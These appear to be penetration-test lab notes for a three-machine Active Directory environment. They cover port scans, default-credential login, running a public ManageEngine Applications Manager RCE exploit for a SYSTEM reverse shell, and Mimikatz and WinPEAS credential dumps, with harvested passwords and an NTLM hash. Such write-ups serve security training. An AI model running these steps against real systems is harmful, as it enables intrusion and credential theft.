Three-machine enterprise environment

## Objectives
- Exploit vulnerabilities in ManageEngine
- Pivot through internal services
- Leverage insecure GPO permissions to escalate privileges
- Compromise the domain

# Domain
- dc01

**Name**
- secura.yzx
- era.secura.local

**Users:Passwords**
- charlotte
- michael
- Administrator
	- NTLM     : a51493b0b06e5e35f855245e71af1d14
	- SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
         * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!
	- Winpeas
		- DefaultUserName              :  administrator
		- DefaultPassword               :  Reality2Show4!.?




# 192.168.x.95

**proof.txt** - b0624467dd801d947277061ea5e6bb70

## Methodology:
- Discovered website (44444/HTTP, 8443/HTTPS) with Nmap scan
- Manage Engine's Applications Manager v.14710 w/ manual browsing
- Online search shows working default creds `admin:admin`
	- Fuzzing seems like rabbit hole
- Searchsploit shows RCE exploit `48793.py` 
- Gain reverse shell on 95 as NT AUTH/SYSTEM
- Enumeration:
	- net use - Users: `charlotte`, `michael`
	- WinPEAS - Auto-login creds: `administrator:Reality2Show4!.?`
	- Mimikatz - `sekurlsa::logonpasswords`
		- Admin's NTLM: a51493b0b06e5e35f855245e71af1d14
		- Username : apache
		- Domain   : era.secura.local
		- Password : New2Era4.!
	- Search for loot
		- C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0 - password.txt


## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.95
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	5001/tcp  open  commplex-link
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	8443/tcp  open  https-alt
	12000/tcp open  cce4x
	44444/tcp open  cognex-dataman
	47001/tcp open  winrm
	49664/tcp open  unknown
	...
	49672/tcp open  unknown
	54233/tcp open  unknown
	54234/tcp open  unknown
	57499/tcp open  unknown
	57528/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC -p 135,139,445,5001,5040,5985,8443,12000,44444,47001,49664-49672,54233,54234,57499,57528 -oN 95/open_sVsC.txt 192.168.184.95

	PORT      STATE SERVICE         VERSION
	135/tcp   open  msrpc           Microsoft Windows RPC
	139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5001/tcp  open  commplex-link?
	| fingerprint-strings: 
	|   SIPOptions: 
	|     HTTP/1.1 200 OK
	|     Content-Type: text/html; charset=ISO-8859-1
	|     Content-Length: 132
	|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.45.151" startpage=""/>
	5040/tcp  open  unknown
	5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	8443/tcp  open  ssl/https-alt   AppManager
	|_ssl-date: 2024-10-04T21:10:47+00:00; +23s from scanner time.
	| http-methods: 
	|_  Supported Methods: GET POST
	|     ...
	|_http-server-header: AppManager
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 
	|     Set-Cookie: JSESSIONID_APM_44444=D241E712005F1007093B06D49B69E9E7; Path=/; Secure; HttpOnly
	|     ...
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=BFF7138A476CEFB2A186528223679C18; Path=/; Secure; HttpOnly
	|     ...
	|   HTTPOptions: 
	|     HTTP/1.1 403 
	|     Set-Cookie: JSESSIONID_APM_44444=12DFCD8A8B51EC270867F1E23B775B74; Path=/; Secure; HttpOnly    # NOTE -> Follows info we get for port 44444
	|     ...
	12000/tcp open  cce4x?
	44444/tcp open  cognex-dataman?
	| fingerprint-strings: 
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=269CC0F0F745522FEB8406F313710AC3; Path=/; HttpOnly
	|     ...
	|     Server: AppManager
	|   ...
	|   RTSPRequest: 
	|     HTTP/1.1 505 
	|     vary: accept-encoding
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 2142
	|     Date: Fri, 04 Oct 2024 21:06:58 GMT
	|     Server: AppManager
	|     ...
	47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc           Microsoft Windows RPC
	49665/tcp open  msrpc           Microsoft Windows RPC
	49666/tcp open  msrpc           Microsoft Windows RPC
	49667/tcp open  msrpc           Microsoft Windows RPC
	49668/tcp open  msrpc           Microsoft Windows RPC
	49669/tcp open  msrpc           Microsoft Windows RPC
	49670/tcp open  msrpc           Microsoft Windows RPC
	49671/tcp open  msrpc           Microsoft Windows RPC
	49672/tcp open  tcpwrapped
	54233/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	54234/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	57499/tcp open  java-rmi        Java RMI
	57528/tcp open  unknown
	
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	...
	
	Host script results:
	|_clock-skew: mean: 23s, deviation: 0s, median: 22s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2024-10-04T21:09:28
	|_  start_date: N/A
```


## Site

![](SECURA_95_site.png)

- Fuzz - Nothing actionable?
```bash
ffuf -u http://192.168.184.95:44444/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ffuf_44444.txt

cat ffuf_44444.txt | jq | grep url
      "url": "http://192.168.159.95:44444/images",
      "url": "http://192.168.159.95:44444/bin",
      "url": "http://192.168.159.95:44444/lib",
      "url": "http://192.168.159.95:44444/flash",
      "url": "http://192.168.159.95:44444/backup",
      "url": "http://192.168.159.95:44444/data",
      "url": "http://192.168.159.95:44444/blog",
      "url": "http://192.168.159.95:44444/logs",
      "url": "http://192.168.159.95:44444/common",
      "url": "http://192.168.159.95:44444/classes",
      "url": "http://192.168.159.95:44444/template",
      "url": "http://192.168.159.95:44444/help",
      "url": "http://192.168.159.95:44444/resources",
      "url": "http://192.168.159.95:44444/html",
      "url": "http://192.168.159.95:44444/users",
      "url": "http://192.168.159.95:44444/support",
      "url": "http://192.168.159.95:44444/mobile",
      "url": "http://192.168.159.95:44444/reports",
      "url": "http://192.168.159.95:44444/conf",
      "url": "http://192.168.159.95:44444/maps",
      "url": "http://192.168.159.95:44444/icons",
      "url": "http://192.168.159.95:44444/projects",
      "url": "http://192.168.159.95:44444/custom",
      "url": "http://192.168.159.95:44444/Reports",
      "url": "http://192.168.159.95:44444/mysql",
      "url": "http://192.168.159.95:44444/toolbar",
      "url": "http://192.168.159.95:44444/Agent",
      "url": "http://192.168.159.95:44444/apache",
      "url": "http://192.168.159.95:44444/",
      "url": "http://192.168.159.95:44444/Cert",
      "url": "http://192.168.159.95:44444/discovery",
      "url": "http://192.168.159.95:44444/j_security_check"
```


- Default creds `admin:admin` work
![](SECURA_95_site_about.png)

- Searchsploit
```bash
searchsploit manage engine application manager 14
	---------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                          |  Path
	---------------------------------------------------------------------------------------- ---------------------------------
	...
	ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)         | java/webapps/48793.py
	...
	---------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```


## Reverse Shell

- Using 48793.py
	- `sudo apt update && sudo apt install default-jdk`
	- `sed -i 's/release 7/release 8/g' 48793.py`
```bash
python3 48793.py http://192.168.184.95:44444 admin admin 192.168.45.201 6666 
	[*] Visiting page to retrieve initial cookies...
	[*] Retrieving admin cookie...
	[*] Getting base directory of ManageEngine...
	[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
	[*] Creating JAR file...
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	warning: [options] source value 8 is obsolete and will be removed in a future release
	warning: [options] target value 8 is obsolete and will be removed in a future release
	warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
	3 warnings
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	added manifest
	adding: weblogic/jndi/Environment.class(in = 1844) (out= 1098)(deflated 40%)
	[*] Uploading JAR file...
	[*] Attempting to upload JAR directly to targeted Weblogic folder...
	[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
	[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
	[*] Found actionname: move_weblogic_jar3864 with found actionid 10000003
	[*] Executing created task with id: 10000003 to copy JAR...
	[*] Task 10000003 has been executed successfully
	[*] Deleting created task as JAR has been copied...
	[*] Running the Weblogic credentialtest which triggers the code in the JAR...
	[*] Check your shell...
```
	- Got a shell.   NOTE:  Attack didn't work initially.  Came back after a couple days and it suddenly did.

```powershell
whoami
	nt authority\system

cd C:\

dir /s proof.txt
	Volume in drive C has no label.
	 Volume Serial Number is A878-B85B
	
	 Directory of C:\Users\Administrator\Desktop
	
	10/09/2024  09:40 PM                34 proof.txt
	               1 File(s)             34 bytes
	
	     Total Files Listed:
	               1 File(s)             34 bytes
	               0 Dir(s)  16,780,812,288 bytes free

type c:\users\administrator\desktop\proof.txt
	b0624467dd801d947277061ea5e6bb70
```

## Further enumeration

- Default web working directory
```powershell
dir
 Directory of C:\Program Files\ManageEngine\AppManager14\working
	...
	08/03/2022  10:15 PM                 0 adtappmanager.txt
	08/03/2022  10:17 PM                 0 am.lock
	06/08/2020  01:12 PM    <DIR>          apache
	...
	06/08/2020  01:09 PM           622,360 wrapper.exe


type mysql\my.ini
	#default password for MySQL
	password=appmanager
```

- Look for interesting files in user's path
```powershell
Get-ChildItem -Path . -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf,*.db,*.ini -Recurse -ErrorAction SilentlyContinue -Force -Exclude desktop.ini

    Directory: C:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   5:01 PM        1048576 ActivitiesCache.db                                                   


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\AdPlatform
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/25/2024   2:09 PM                auto_show_data.db                                                    


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        10/10/2024   8:54 PM                assets.db                                                            


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/28/2024   1:27 AM                coupons_data.db                                                      


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeEDrop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:59 PM          32768 EdgeEDropSQLite.db                                                   


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeHubAppUsage
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:59 PM          32768 EdgeHubAppUsageSQLite.db                                             


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/28/2024   1:26 AM                EntityExtractionAssetStore.db                                        

...                                                        

    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/20/2022  10:45 PM          16384 heavy_ad_intervention_opt_out.db                                     
-a----         1/25/2024   2:09 PM          81920 load_statistics.db                                                   


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          3/9/2022   3:49 AM         307015 english_wikipedia.txt                                                
-a----          3/9/2022   3:49 AM          30420 female_names.txt                                                     
-a----          3/9/2022   3:49 AM           7656 male_names.txt                                                       
-a----          3/9/2022   3:49 AM         271951 passwords.txt                   # NOTE                                                        
-a----          3/9/2022   3:49 AM          86077 surnames.txt                                                         
-a----          3/9/2022   3:49 AM         183450 us_tv_and_film.txt                                                   


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/28/2024   1:27 AM          49152 first_party_sets.db                                                  

...                                                     

    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\24.171.0825.0002
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:54 PM          59980 ThirdPartyNotices.txt                                                


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\ListSync\Business1\settings
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:54 PM          61440 Microsoft.ListSync.db                                                
-a----        10/10/2024   9:02 PM          16384 Microsoft.ListSync.Settings.db                                       


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\logs\Common
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/18/2024   7:25 PM             77 DeviceHealthSummaryConfiguration.ini                                 
-a----         9/27/2024   4:59 PM             12 telemetry-dll-ramp-value.txt                                         


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\logs\ListSync\Business1
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/10/2024   8:56 PM             12 telemetry-dll-ramp-value.txt                                         


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\logs\Personal
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/25/2024   2:07 PM             77 DeviceHealthSummaryConfiguration.ini                                 
-a----         9/27/2024   4:53 PM             12 telemetry-dll-ramp-value.txt                                         


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\settings\Personal
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/19/2022   8:31 PM            308 assertInformation.ini                                                
-a----         9/27/2024   5:01 PM           3686 global.ini                                                           
-a----        10/10/2024  10:44 PM            108 logUploaderSettings.ini                                              
-a----        10/10/2024  10:44 PM            108 logUploaderSettings_temp.ini                                         
-a----         9/27/2024   5:01 PM          16384 OCSI.db                                                              
-a----         9/27/2024   4:54 PM          20480 SettingsDatabase.db                                                  
-a----         9/27/2024   5:01 PM         118784 SyncEngineDatabase.db                                                


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\settings
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:54 PM          12288 CxP.db                                                               


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\setup\logs
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/19/2022   8:31 PM             77 DeviceHealthSummaryConfiguration.ini                                 


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/19/2022   8:38 PM          16384 cversions.1.db                                                       
-a----         7/19/2022   8:30 PM          16384 cversions.3.db                                                       
-a----         7/20/2022   3:03 PM         423864 {0BDE7B0F-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db    
-a----         9/28/2024   1:26 AM          86944 {3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000030.db    
-a----         1/25/2024   2:16 PM         136504 {AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000005.db    
-a----         9/27/2024   5:01 PM        1707592 {AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000006.db    


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Explorer
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/19/2022   8:30 PM             24 iconcache_1280.db                                                    
...                                             
-a----         7/19/2022   8:30 PM             24 thumbcache_wide_alternate.db                                         


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Notifications
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   5:01 PM        1048576 wpndatabase.db                                                       


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Windows Sidebar
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         12/7/2019   9:12 AM             80 settings.ini                                                         


    Directory: 
    C:\Users\Administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype 
    for Store\logs
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/25/2024   2:10 PM           3527 updatetasklogs.txt                                                   


    Directory: 
    C:\Users\Administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype 
    for Store
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/25/2024   2:10 PM             36 msixid.txt                                                           


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\DiagOutputDir
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/20/2022   3:21 PM          24201 SkypeApp0.txt                                                        


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Apps_{7ea56b3a-7dca-4c87-bdf9-4467f52e51f2}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:56 PM          39693 0.0.filtertrie.intermediate.txt                                      
-a----         9/27/2024   4:56 PM              5 0.1.filtertrie.intermediate.txt                                      
-a----         9/27/2024   4:56 PM              5 0.2.filtertrie.intermediate.txt                                      


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Apps_{aefafe3c-a6f2-4170-9307-8aa21aaa6593}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/10/2024  10:57 PM          39693 0.0.filtertrie.intermediate.txt                                      
-a----        10/10/2024  10:57 PM              5 0.1.filtertrie.intermediate.txt                                      
-a----        10/10/2024  10:57 PM              5 0.2.filtertrie.intermediate.txt                                      


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Apps_{d672a6b6-cb30-4bec-b1ec-6e85fcd1ce9f}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/10/2024   9:12 PM          39693 0.0.filtertrie.intermediate.txt                                      
-a----        10/10/2024   9:12 PM              5 0.1.filtertrie.intermediate.txt                                      
-a----        10/10/2024   9:12 PM              5 0.2.filtertrie.intermediate.txt                                      


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Input_{0d340afb-8092-4dbd-8ba1-729eab6c35ed}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         11/3/2022   8:46 AM        1425902 appsconversions.txt                                                  
-a----         11/7/2022  10:00 PM         339360 appsglobals.txt                                                      
-a----         11/7/2022  10:00 PM         383001 appssynonyms.txt                                                     
-a----         11/3/2022   8:46 AM         532750 settingsconversions.txt                                              
-a----         11/7/2022  10:00 PM          62358 settingsglobals.txt                                                  
-a----         11/7/2022  10:00 PM         128646 settingssynonyms.txt                                                 


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Settings_{3592d4bb-b150-417f-a6f2-9a5be5741b97}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/18/2024  12:34 PM         223552 0.0.filtertrie.intermediate.txt                                      
-a----         1/18/2024  12:34 PM              5 0.1.filtertrie.intermediate.txt                                      
-a----         1/18/2024  12:34 PM              5 0.2.filtertrie.intermediate.txt                                      


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\Constrai
    ntIndex\Settings_{d0250b80-250b-4e52-8e71-b041b91a5ad0}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/20/2022   3:03 PM         215889 0.0.filtertrie.intermediate.txt                                      
-a----         7/20/2022   3:03 PM              5 0.1.filtertrie.intermediate.txt                                      
-a----         7/20/2022   3:03 PM              5 0.2.filtertrie.intermediate.txt                                      


    Directory: 
    C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\DeviceSearchCache
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/10/2024  10:57 PM         103604 AppCache133730746332344271.txt                                       
-a----         1/18/2024  12:34 PM         695177 SettingsCache.txt                                                    


    Directory: 
    C:\Users\Administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\LocalState\DiagOutputDir
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/25/2024   2:12 PM            281 LogFile_January_25_2024__2_12_2.txt                                  
-a----         7/20/2022   3:20 PM            281 LogFile_July_20_2022__8_20_54.txt                                    


    Directory: 
    C:\Users\Administrator\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalState\DiagOutputDir
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:59 PM          60890 XboxGamingOverlayTraces_FT_Server_20240927165440.txt                 


    Directory: C:\Users\Administrator\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalState
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/27/2024   4:59 PM           1292 profileDataSettings.txt                                              


    Directory: C:\Users\Administrator\AppData\Local
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-h--         9/27/2024   5:01 PM          16324 IconCache.db                                                         


    Directory: C:\Users\Administrator\AppData\Roaming\InstallShield Installation 
    Information\{E0E5B070-935C-4911-843C-E4AC396B63C2}
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         3/21/2016   8:04 PM          22480 0x0409.ini                                                           
-a----         3/23/2016   1:57 AM          14946 0x0411.ini                                                           
-a----         8/12/2016   8:54 PM          10730 0x0804.ini                                                           
-a----          8/3/2022  10:12 PM           2558 setup.ini                                                            


    Directory: C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\0vgiq4v0.default
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/21/2022   3:10 PM          65536 cert8.db                                                             
-a----         7/21/2022   3:09 PM            199 compatibility.ini                                                    
-a----         7/20/2022  10:44 PM            179 extensions.ini                                                       
-a----         7/21/2022   3:10 PM          16384 key3.db                                                              
-a----         7/20/2022  10:44 PM          16384 secmod.db                                                            
-a----         7/21/2022   3:10 PM              0 SiteSecurityServiceState.txt                                         


    Directory: C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/20/2022  10:44 PM            122 profiles.ini                                                         


    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/10/2024   8:44 PM             34 proof.txt                                                            


    Directory: C:\Users\Administrator
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
---hs-         7/19/2022   8:30 PM             20 ntuser.ini
```

- Domain Users
```powershell
net user /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	Administrator            charlotte                DefaultAccount           
	Guest                    krbtgt                   michael                  
	The command completed with one or more errors.


net user charlotte /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    charlotte
	Full Name                    charlotte
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:37:50 PM
	Password expires             Never
	Password changeable          8/6/2022 6:37:50 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      *Remote Management Use
	Global Group memberships     *Domain Users         
	The command completed successfully.


net user michael /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    michael
	Full Name                    michael
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:36:23 PM
	Password expires             Never
	Password changeable          8/6/2022 6:36:23 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      
	Global Group memberships     *Domain Users         
	The command completed successfully.
```


- Domain Groups
```powershell
net group /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	Group Accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Protected Users
	*Read-only Domain Controllers
	*Schema Admins
	The command completed with one or more errors.
```


- Domain Shares
```powershell
net view \\dc01 /all
	Shared resources at \\dc01
	
	Share name  Type  Used as  Comment              
	-------------------------------------------------------------------------------
	ADMIN$      Disk           Remote Admin         
	C$          Disk           Default share        
	IPC$        IPC            Remote IPC           
	NETLOGON    Disk           Logon server share   
	SYSVOL      Disk           Logon server share   
	test        Disk                                
	The command completed successfully.
```
	- `dc01` was discovered during nmap -sV scan of .97


## Mimikatz

- Dump of creds
```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 301541 (00000000:000499e5)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURE
Logon Server      : SECURE
Logon Time        : 9/28/2024 1:25:49 AM
SID               : S-1-5-21-3197578891-1085383791-1901100223-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SECURE
         * NTLM     : a51493b0b06e5e35f855245e71af1d14
         * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
		...
         * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!
        cloudap :
```

## WinPEAS

```powershell
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  Reality2Show4!.?
```









# 192.168.x.96

## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.96
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3306/tcp  open  mysql
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	7680/tcp  open  pando-pub
	47001/tcp open  winrm
	49664/tcp open  unknown
	49665/tcp open  unknown
	49666/tcp open  unknown
	49667/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49671/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC 192.168.184.96 -p 135,139,445,3306,5040,5985,7680,47001,49664-49671 -oN open_sVsC.txt  
	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql?
	| fingerprint-strings: 
	|   NotesRPC: 
	|_    Host '192.168.45.201' is not allowed to connect to this MariaDB server
	5040/tcp  open  unknown
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	7680/tcp  open  pando-pub?
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
